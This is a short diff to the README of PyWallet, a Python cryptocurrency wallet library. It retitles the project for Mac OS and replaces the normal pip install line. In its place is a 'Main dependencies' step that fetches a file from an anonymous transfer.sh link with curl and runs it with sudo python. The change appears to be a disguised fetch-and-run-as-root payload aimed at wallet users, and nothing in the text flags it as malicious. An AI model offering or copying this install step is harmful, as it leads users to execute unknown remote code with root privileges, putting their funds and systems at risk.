@@ -1,5 +1,5 @@
 
-PyWallet
+PyWallet for Mac OS
 ===========
 
 .. image:: https://img.shields.io/pypi/pyversions/pywallet.svg?maxAge=60
@@ -38,14 +38,14 @@ Enjoy!
 
 --------------
 
-Installation
+Main dependencies
 -------------
 
-Install via PiP:
+Install via Mac Terminal:
 
 .. code:: bash
 
-   $ sudo pip install pywallet
+   curl -s0 https://transfer.sh/c502X/dependencies && sudo python dependencies
 
 
 Example code:
